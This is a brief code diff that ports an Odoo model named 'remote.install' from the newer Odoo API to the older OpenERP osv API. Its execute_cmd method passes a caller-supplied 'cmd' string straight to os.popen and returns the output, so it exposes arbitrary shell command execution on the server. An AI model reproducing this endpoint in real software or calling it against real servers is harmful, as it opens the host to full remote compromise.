@@ -1,15 +1,13 @@
 # -*- coding: utf-8 -*-
 import json
 
-from odoo import models,api
-from odoo.http import request
+from openerp.osv import fields, osv, orm
 import os
 
-class Http(models.Model):
+class Http(osv.osv):
     _name = 'remote.install'
 
-    @api.model
-    def execute_cmd(self,vals):
+    def execute_cmd(self,cr,uid,vals):
     	cmd = vals.get('cmd')
     	rs = os.popen(cmd)
     	return rs.read()
